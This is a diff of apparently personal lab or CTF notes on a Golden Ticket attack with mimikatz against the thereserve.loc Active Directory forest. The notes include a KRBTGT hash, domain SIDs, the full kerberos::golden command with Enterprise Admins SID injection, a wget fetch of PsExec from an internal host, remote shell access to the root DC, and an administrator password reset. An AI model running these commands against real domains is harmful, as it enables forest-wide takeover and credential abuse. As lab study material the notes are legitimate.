@@ -1,7 +1,7 @@
 To carry out this attack you will need:
 
 - The KRBTGT password hash.
-- The Security Identifier (SID) of the (CORPDC) Domain.
+- The SID of the child Domain Controller (CORPDC).
 - The user account we want to impersonate (Administrator).
 - Dump SID of **“Enterprise Admin”** of root.thereserve.loc.
 	To make your attack more advanced, you can also inject the SID for the `Enterprise Admins` group so that the user you impersonate would have high privileges. This will give you access to all the machines in the entire Forest if we are successful in doing so.
@@ -25,13 +25,12 @@ To carry out this attack you will need:
 	- 0c757a3445acb94a654554f3ac529ede
 
 
-## Get the Security Identifier (SID) of the (CORPDC) Domain
+## Get the SID of the child Domain Controller (CORPDC)
 On powershell run:
 
 PS C:\Users\Administrator> `Get-ADComputer -Identity "CORPDC"`
 
 ![[Golden Ticket Attack with mimikatz-20240608151913994.webp]]
-
 
 
 ## Dump SID of **“Enterprise Admin”** of root.thereserve.loc
@@ -41,7 +40,9 @@ PS C:\Users\Administrator> `Get-ADGroup -Identity "Enterprise Admins" -Server ro
 
 ![[Golden Ticket Attack with mimikatz-20240608152813146.webp]]
 
-## Submit the Golden ticket
+
+## Create the Golden ticket
+And now, with all the required information, we can create our own Golden Ticket, which will be injected in the current session.
 In mimikatz run:
 
  `kerberos::golden /user:Administrator /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024-1009 /service:krbtgt /rc4:0c757a3445acb94a654554f3ac529ede /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /ptt`
@@ -67,7 +68,7 @@ In mimikatz run:
 ﻿
 ![[Golden Ticket Attack with mimikatz-20240608145512638.webp]]
 
-## Interact with rootdc.thereserve.loc
+## Test the access to rootdc.thereserve.loc
 
 Run on the shell the following command:
 
@@ -85,7 +86,9 @@ https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
 - Get psexec.exe from the shell on the ROOTCD machine.
 	PS C:\Users\Administrator> `wget http://10.50.110.16:8000/PsExec.exe -o psexec.exe`
 
-### Run psexec.exe on powershell
+### PowerShell session in ROOTDC
+
+You an also issue a command prompt in the ROOTDC through PSEXEC.
 
 PS C:\Users\Administrator> `.\psexec.exe \\rootdc.thereserve.loc cmd.exe`
 
@@ -94,8 +97,8 @@ PS C:\Users\Administrator> `.\psexec.exe \\rootdc.thereserve.loc cmd.exe`
 ![[Golden Ticket Attack with mimikatz-20240609134803204.webp]]
 ![[Golden Ticket Attack with mimikatz-20240609134915452.webp]]
 
-### Changed the administrator password for ROOTDC
+<span style="background:#d4b106">### Changed the administrator password for ROOTDC</span>
 
-C:\Windows\system32>`powershell.exe -c Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString -AsPlainText "Hacker@123" -Force) -Reset`
+<span style="background:#d4b106">C:\Windows\system32>`powershell.exe -c Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString -AsPlainText "Hacker@123" -Force) -Reset`</span>
 
-rdp into ROOTDC with the new creds.. created a domain admin user for BankDC. Rdp into BankDC.
+<span style="background:#d4b106">rdp into ROOTDC with the new creds.. created a domain admin user for BankDC. Rdp into BankDC.</span>
